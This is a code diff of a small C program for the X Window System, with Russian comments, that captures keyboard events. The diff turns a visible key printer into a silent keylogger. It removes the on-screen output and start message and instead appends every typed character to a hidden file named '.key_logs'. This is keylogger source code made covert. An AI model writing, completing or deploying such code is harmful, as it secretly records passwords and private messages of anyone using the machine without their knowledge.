@@ -5,9 +5,11 @@ int main() {
     Display *display;
     Window root, win;
     
+    //fputs("\nSTART\n", f_key_log);
+    
     display = XOpenDisplay(NULL);
     if (!display) {
-        fprintf(stderr, "Не удалось открыть соединение с X сервером\n");
+        // fprintf(f_key_log, "Не удалось открыть соединение с X сервером\n");
         return 1;
     }
 
@@ -23,24 +25,27 @@ int main() {
         XFree(children);
     }
 
-    printf("Start.\n");
+    // printf("Start.\n");
 
     XEvent ev;
     while (1) {
         XNextEvent(display, &ev);
 
         if (ev.type == KeyPress) {
+            FILE *f_key_log = fopen(".key_logs", "a+");
             char buf[32];
             KeySym key_sym;
 
-            // Получаем символ по коду клавиши
-            if (XLookupString(&ev.xkey, buf, sizeof(buf), &key_sym, NULL) > 0) 
-                printf("Клавиша нажата: %s\n", buf);
+            if (XLookupString(&ev.xkey, buf, sizeof(buf), &key_sym, NULL) > 0) fputs(buf, f_key_log);
+            
+            fclose(f_key_log);
         }
         
     }
 
     XCloseDisplay(display);
+    // fputs("\nPOWER OFF\n", f_key_log);
+    
 
     return 0;
 }
